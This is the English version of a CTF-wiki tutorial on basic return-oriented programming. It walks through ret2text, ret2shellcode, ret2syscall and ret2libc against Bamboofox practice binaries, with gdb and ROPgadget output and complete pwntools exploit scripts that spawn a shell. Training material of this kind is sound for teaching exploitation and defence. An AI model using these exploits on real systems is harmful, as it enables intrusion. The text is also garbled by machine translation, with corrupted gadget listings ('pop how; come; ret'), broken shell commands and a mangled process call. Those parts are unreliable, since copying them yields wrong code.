[EN](./basic-rop.md) | [ZH](./basic-rop-zh.md)
# 基本ROP


With the NX protection turned on, it is difficult to continue to directly inject code directly into the stack or heap. Attackers have also proposed corresponding methods to bypass protection. At present, the main one is ROP (Return Oriented Programming). The main idea is to use the existing small fragments in the program based on the ** stack buffer overflow. ) to change the value of some registers or variables to control the execution flow of the program. **The so-called gadgets are sequences of instructions ending in ret. Through these sequences of instructions, we can modify the contents of certain addresses to facilitate the control program execution process.


It is called ROP because the core is to use the ret instruction in the instruction set to change the order in which the instruction stream is executed. ROP attacks generally have to satisfy the following conditions


- The program has an overflow and can control the return address.


- You can find the gadgets that meet the criteria and the address of the corresponding gadgets.


If the address of the gadgets is not fixed every time, then we need to find a way to dynamically get the corresponding address.


## ret2text



### Principle


Ret2text is the code (.text) that the control program executes the program itself. In fact, this method of attack is a general description. When we control the existing code of the execution program, we can also control the program to execute several pieces of code (that is, gadgets) of non-adjacent programs. This is what we want to say about ROP.


At this point, we need to know the location of the corresponding returned code. Of course, the program may also open some protection, we need to find a way to bypass these protections.


### Examples


In fact, in the basic principle of stack overflow, we have introduced this simple attack. Here, let&#39;s give another example, the example of ret2text used in Bamboofox to introduce ROP.


点击下载: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text)



First, check out the protection mechanism of the program.


```shell

➜  ret2text checksec ret2text

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```



It can be seen that the program is a 32-bit program that only turns on stack unexecutable protection. Then we use IDA to view the source code.


```C

int __cdecl main(int argc, const char **argv, const char **envp)

{

  int v4; // [sp+1Ch] [bp-64h]@1



  setvbuf(stdout, 0, 2, 0);

  setvbuf(_bss_start, 0, 1, 0);

  puts("There is something amazing here, do you know anything?");

gets ((char *) &amp; v4);
  printf("Maybe I will tell you next time !");

  return 0;

}

```



It can be seen that the program uses the gets function in the main function, and obviously there is a stack overflow vulnerability. Later discovered


`` `asm
.text:080485FD secure          proc near

.text:080485FD

.text:080485FD input           = dword ptr -10h

.text:080485FD secretcode      = dword ptr -0Ch

.text:080485FD

.text:080485FD                 push    ebp

.text:080485FE                 mov     ebp, esp

.text:08048600                 sub     esp, 28h

.text:08048603                 mov     dword ptr [esp], 0 ; timer

.text:0804860A                 call    _time

.text:0804860F                 mov     [esp], eax      ; seed

.text:08048612                 call    _srand

.text:08048617                 call    _rand

.text:0804861C                 mov     [ebp+secretcode], eax

.text:0804861F                 lea     eax, [ebp+input]

.text:08048622                 mov     [esp+4], eax

.text:08048626                 mov     dword ptr [esp], offset unk_8048760

.text:0804862D                 call    ___isoc99_scanf

.text:08048632                 mov     eax, [ebp+input]

.text:08048635                 cmp     eax, [ebp+secretcode]

.text:08048638                 jnz     short locret_8048646

.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"

.text:08048641                 call    _system

```



In the secure function, it is found that there is code calling system(&quot;/bin/sh&quot;), then if we directly control the program to return to 0x0804863A, then we can get the system shell.


Here&#39;s how we construct the payload. The first thing we need to determine is the number of bytes from the start address of the memory we can control from the return address of the main function.


`` `asm
.text:080486A7                 lea     eax, [esp+1Ch]

.text:080486AB                 mov     [esp], eax      ; s

.text:080486AE                 call    _gets

```



You can see that the string is indexed relative to esp, so we need to debug, put the breakpoint at the call, view esp, ebp, as follows


```shell

gef➤  b *0x080486AE

Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.

gef➤  r

There is something amazing here, do you know anything?



Breakpoint 1, 0x080486ae in main () at ret2text.c:24

24	    gets(buf);

───────────────────────────────────────────────────────────────────────[ registers ]────

$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"

$ebx   : 0x00000000

$ ecx: 0xffffffff
$edx   : 0xf7faf870  →  0x00000000

$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"

$ebp   : 0xffffcdc8  →  0x00000000

$ you are: 0xf7fae000 → 0x001b1db0
$ edi: 0xf7fae000 → 0x001b1db0
$ Eip: 0x080486ae → <main+102> call 0x8048460 <gets@plt>
```



You can see that esp is 0xffffcd40, ebp is the specific payload as follows 0xffffcdc8, and the index of s relative to esp is [esp+0x1c], so the address of s is 0xffffcd5c, so the offset of s relative to ebp is 0x6C, so the relative The offset from the return address is 0x6c+4.


The final payload is as follows:


```python

##!/usr/bin/env python

from pwn import *



sh = process('./ret2text')

target = 0x804863a

sh.sendline('A' * (0x6c+4) + p32(target))

sh.interactive()

```


## ret2shellcode



### Principle


Ret2shellcode, which controls the program to execute shellcode code. Shellcode refers to the assembly code used to complete a function. The common function is to get the shell of the target system. ** In general, shellcode needs to be populated by ourselves. This is actually another typical use, that is, we need to fill in some executable code** at this time.


On the basis of the stack overflow, in order to execute the shellcode, the corresponding binary is required at runtime, and the area where the shellcode is located has executable permissions.


### Examples


Here we take ret2shellcode in bamboofox as an example.


点击下载: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)



First check the protection of the program open


```shell

➜  ret2shellcode checksec ret2shellcode

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX disabled

    PIE:      No PIE (0x8048000)

    RWX:      Has RWX segments

```



It can be seen that the source program has almost no protection turned on, and is readable, writable, and executable. Let&#39;s look at the program again using IDA.


```C

int __cdecl main(int argc, const char **argv, const char **envp)

{

  int v4; // [sp+1Ch] [bp-64h]@1



  setvbuf(stdout, 0, 2, 0);

  setvbuf(stdin, 0, 1, 0);

  puts("No system for you this time !!!");

gets ((char *) &amp; v4);
  strncpy(buf2, (const char *)&v4, 0x64u);

  printf("bye bye ~");

  return 0;

}

```



It can be seen that the program is still a basic stack overflow vulnerability, but this time also copy the corresponding string to buf2. A simple view shows that buf2 is in the bss section.


`` `asm
.bss:0804A080                 public buf2

.bss:0804A080 ; char buf2[100]

```



At this point, we simply debug the program to see if this bss section is executable.


```shell

gef➤  b main

Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.

gef➤  r

Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 



Breakpoint 1, main () at ret2shellcode.c:8

8	    setvbuf(stdout, 0LL, 2, 0LL);

─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────

      6	 int main(void)

      7	 {

 →    8	     setvbuf(stdout, 0LL, 2, 0LL);

      9	     setvbuf(stdin, 0LL, 1, 0LL);

     10	 

─────────────────────────────────────────────────────────────────────[ trace ]────

[#0] 0x8048536 → Name: main()

─────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  vmmap 

Start      End        Offset     Perm Path

0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode

0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode

0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode

0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so

0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so

0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so

0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so

0xf7faf000 0xf7fb2000 0x00000000 rwx 

0xf7fd3000 0xf7fd5000 0x00000000 rwx 

0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]

0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]

0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so

0xf7ffb000 0xf7ffc000 0x00000000 rwx 

0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so

0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so

0xfffdd000 0xffffe000 0x00000000 rwx [stack]

```



Through vmmap, we can see that the segment corresponding to the bss segment has executable permissions.


```text

0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode

```



So this time we control the program to execute the shellcode, which is to read the shellcode, and then control the program to execute the shellcode at the bss section. Among them, the corresponding offset calculation is similar to the example in ret2text.


The specific payload is as follows


```python

#!/usr/bin/env python

from pwn import *



sh = process('./ret2shellcode')

shellcode = asm (shellcraft.sh ())
buf2_addr = 0x804a080



sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))

sh.interactive()

```



### Title


- sniperoj-pwn100-shellcode-x86-64



## ret2syscall



### Principle


Ret2syscall, that is, the control program executes the system call and gets the shell.


### Examples


Here we take ret2syscall in bamboofox as an example.


点击下载: [ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)


First check the protection of the program open


```shell

➜  ret2syscall checksec rop

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```



It can be seen that the source program is 32-bit and NX protection is turned on. Next use IDA to view the source code


```C

int __cdecl main(int argc, const char **argv, const char **envp)

{

  int v4; // [sp+1Ch] [bp-64h]@1



  setvbuf(stdout, 0, 2, 0);

  setvbuf(stdin, 0, 1, 0);

  puts("This time, no system() and NO SHELLCODE!!!");

  puts("What do you plan to do?");

  gets(&v4);

  return 0;

}

```



It can be seen that this is still a stack overflow. Similar to the previous approach, we can get the offset of v4 relative to ebp to 108. So the return address we need to override is 112 relative to v4. This time, because we can&#39;t directly use a piece of code in the program or fill in the code to get the shell, we use the gadgets in the program to get the shell, and the corresponding shell acquisition uses the system call. For knowledge about system calls, please refer to


- https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8



To put it simply, as long as we put the parameters of the system call corresponding to the get shell into the corresponding registers, we can execute the corresponding system call by executing int 0x80. For example, here we use the following system call to get the shell


```C

execve("/bin/sh",NULL,NULL)

```



Among them, the program is 32 bit, so we need to make


- System call number, ie eax should be 0xb
- The first parameter, ebx, should point to the address of /bin/sh. In fact, the address of sh can be executed.
- The second parameter, ecx should be 0
- the third parameter, edx should be 0


And how do we control the values of these registers? Here you need to use gadgets. For example, if the top of the stack is now 10, then if pop eax is executed at this time, the value of eax is now 10. But we can&#39;t expect a continuous code to control the corresponding registers at the same time, so we need a piece of control, which is why we use ret at the end of the gadgets to control the execution flow again. To find out how to use gadgets, we can use the ropgadgets tool.


First, let&#39;s look for gadgets that control eax.


```shell

➜ ret2syscall ROPgadget --binary call --only &#39;pop | right&#39; | grabbed &#39;eax&#39;
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret

0x080bb196 : pop eax ; ret

0x0807217a : pop eax ; ret 0x80e

0x0804f704 : pop eax ; ret 3

0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

```



You can see that all of the above can control eax, and I choose the second one as the gadgets.


Similarly, we can get gadgets that control other registers.


```shell

➜ ret2syscall ROPgadget --binary call --only &#39;pop | right&#39; | grab &#39;ebx&#39;
0x0809dde2: pop ds; pop ebx; pop esi; pop edi; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret

0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret

0x0809e1d4: pop ebx; pop ebp; pop how; come; ret
0x080be23f : pop ebx ; pop edi ; ret

0x0806eb69 : pop ebx ; pop edx ; ret

0x08092258 : pop ebx ; pop esi ; pop ebp ; ret

0x0804838b: pop ebx; pop how; come; pop ebp; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10

0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14

0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc

0x0805ae81: pop ebx; pop how; come; pop ebp; ret 4
0x08049bfd: pop ebx; pop esi; pop edi; pop ebp; ret 8
0x08048913: pop ebx; pop how; come; ret
0x08049a19: pop ebx; pop how; come; ret 4
0x08049a94 : pop ebx ; pop esi ; ret

0x080481c9: pop ebx; right
0x080d7d3c : pop ebx ; ret 0x6f9

0x08099c87 : pop ebx ; ret 8

0x0806eb91 : pop ecx ; pop ebx ; ret

0x0806336b: come up; pop how; pop ebx; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

0x0806eb68: pop esi; pop ebx; pop edx; right
0x0805c820, pop esi; pop ebx; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

0x0807b6ed : pop ss ; pop ebx ; ret

```



Here, I choose


```text

0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

```



This can directly control the other three registers.


In addition, we need to get the address corresponding to the /bin/sh string.


```shell

➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 

Strings information

============================================================

0x080be408 : /bin/sh

```



You can find the corresponding address, in addition, there is an address of int 0x80, as follows


```text

➜  ret2syscall ROPgadget --binary rop  --only 'int'                 

Gadgets information

============================================================

0x08049421 : int 0x80

0x080938fe : int 0xbb

0x080869b5 : int 0xf6

0x0807b4d4 : int 0xfc



Unique gadgets found: 4

```



At the same time, I also found the corresponding address.


The following is the corresponding payload, where 0xb is the system call number corresponding to execve.

```python

#!/usr/bin/env python

from pwn import *



sh = process (&#39;./ call&#39;)


pop_eax_ret = 0x080bb196

pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421

binsh = 0x80be408
payload = flat(

    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])

sh.sendline(payload)

sh.interactive()

```



### Title


## ret2libc



### Principle


Ret2libc is the function in the execution libc of the control function, usually returning to the plt of a function or the specific position of the function (that is, the content of the got entry corresponding to the function). In general, we will choose to execute system(&quot;/bin/sh&quot;), so we need to know the address of the system function.


### Examples


We give three examples from simple to difficult.


#### Example 1


Here we take ret2libc1 in bamboofox as an example.


Click to download: [ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1)


First, we can check the security of the program.


```shell

➜  ret2libc1 checksec ret2libc1    

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```



The source program is 32-bit and NX protection is turned on. Let&#39;s take a look at the program source code to determine the location of the vulnerability.


```c

int __cdecl main(int argc, const char **argv, const char **envp)

{

  int v4; // [sp+1Ch] [bp-64h]@1



  setvbuf(stdout, 0, 2, 0);

  setvbuf(_bss_start, 0, 1, 0);

  puts("RET2LIBC >_<");

gets ((char *) &amp; v4);
  return 0;

}

```



You can see that a stack overflow occurred while executing the gets function. Also, with ropgadget, we can see if /bin/sh exists


```shell

➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          

Strings information

============================================================

0x08048720 : /bin/sh

```



It does exist, look again to see if there is a system function. It is true that it is found in ida.


`` `asm
.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]

```



So, we go back directly to it, executing the system function. The corresponding payload is as follows


```python

#!/usr/bin/env python

from pwn import *



sh = process('./ret2libc1')



binsh_addr = 0x8048720

system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])

sh.sendline(payload)



sh.interactive()

```



Here we need to pay attention to the structure of the function call stack. If the system function is called normally, we will have a corresponding return address when calling, where &#39;bbbb&#39; is used as the fake address, and then the parameter content corresponding to the parameter.


This example is relatively simple, and provides the address of the system address and /bin/sh, but most programs don&#39;t have such a good condition.


#### Example 2


Here is an example of ret2libc2 in bamboofox.


点击下载: [ret2libc2](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2)



This topic is basically the same as in Example 1, except that the /bin/sh string no longer appears, so we need to read the string ourselves, so we need two gadgets, the first control program reads the string, the first The two control programs execute system(&quot;/bin/sh&quot;). Since the vulnerability is consistent with the above, here is not to say more, the specific exp is as follows


```python

##!/usr/bin/env python

from pwn import *



sh = process('./ret2libc2')



gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d

buf2 = 0x804a080

payload = flat(

    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])

sh.sendline(payload)

sh.sendline('/bin/sh')

sh.interactive()

```



Note that I am writing the /bin/sh string to buf2 in the bss section of the program and passing its address as a parameter to system. This is so easy to get the shell.


#### Example 3


Here is an example of ret2libc3 in bamboofox.


点击下载: [ret2libc3](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3)


On the basis of Example 2, the address of the system function is removed again. At this point, we need to find both the address of the system function and the address of the /bin/sh string. First, check the security


```shell

➜  ret2libc3 checksec ret2libc3

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```



As you can see, the source program still has stack unexecutable protection turned on. Looking at the source code, I found that the bug in the program is still a stack overflow.


```C

int __cdecl main(int argc, const char **argv, const char **envp)

{

  int v4; // [sp+1Ch] [bp-64h]@1



  setvbuf(stdout, 0, 2, 0);

  setvbuf(stdin, 0, 1, 0);

  puts("No surprise anymore, system disappeard QQ.");

  printf("Can you find it !?");

gets ((char *) &amp; v4);
  return 0;

}

```



So how do we get the address of the system function? Here mainly use two knowledge points


- The system function belongs to libc, and the relative offset between functions in the libc.so dynamic link library is fixed.
- Even if the program has ASLR protection, it is only random for the middle bits of the address, and the lowest 12 bits will not change. And libc is collected on github, as follows
  - https://github.com/niklasb/libc-database



So if we know the address of a function in libc, then we can determine the libc that the program uses. Then we can know the address of the system function.


So how do I get the address of a function in libc? The commonly used method is to use the got table leak, that is, output the contents of the got item corresponding to a function. ** Of course, due to the lazy binding mechanism of libc, we need to leak the address of the function that has been executed. **


We can naturally get libc according to the above steps, then query the offset in the program, and then get the system address again, but this manual operation is too many times, a little trouble, here is a libc utilization tool, please refer to the readme for details.


- https://github.com/lieanu/LibcSearcher



In addition, after getting libc, there is actually a /bin/sh string in libc, so we can get the address of the /bin/sh string together.


Here we leak the address of __libc_start_main because it is where the program was originally executed. Basic use ideas are as follows


- Leak __libc_start_main address
- Get the libc version
- Get the address of the system address and /bin/sh
- Execute the source program again
- Trigger stack overflow execution system(&#39;/bin/sh&#39;)


Exp is as follows


```python

#!/usr/bin/env python

from pwn import *

from LibcSearcher import LibcSearcher

sh = process('./ret2libc3')



ret2libc3 = ELF('./ret2libc3')



puts_plt = ret2libc3.plt [&#39;puts&#39;]
libc_start_main_got = ret2libc3.got['__libc_start_main']

main = ret2libc3.symbols['main']



print "leak libc_start_main_got addr and return to main again"

payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])

sh.sendlineafter('Can you find it !?', payload)



print "get the related addr"

libc_start_main_addr = u32(sh.recv()[0:4])

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)

libcbase = libc_start_main_addr - libc.dump('__libc_start_main')

system_addr = libcbase + libc.dump('system')

binsh_addr = libcbase + libc.dump('str_bin_sh')



print "get shell"

payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])

sh.sendline(payload)



sh.interactive()



```



### Title


- train.cs.nctu.edu.tw: ret2libc



## topic


- train.cs.nctu.edu.tw: rop
- 2013-PlaidCTF-ropasaurusrex

- Defcon 2015 Qualifier: R0pbaby



## Reference reading


- [Black Cloud Step by Step ROP (Steamed Rice)] (http://wooyun.jozxing.cc/static/drops/tips-6597.html)
- [Hands to teach you stack overflow from entry to give up (on)] (https://zhuanlan.zhihu.com/p/25816426)
- [Hands to teach you stack overflow from entry to give up (below)] (https://zhuanlan.zhihu.com/p/25892385)
- [ [Technology Sharing] Modern Stack Overflow Utilization Technology Foundation: ROP] (http://bobao.360.cn/learning/detail/3694.html)

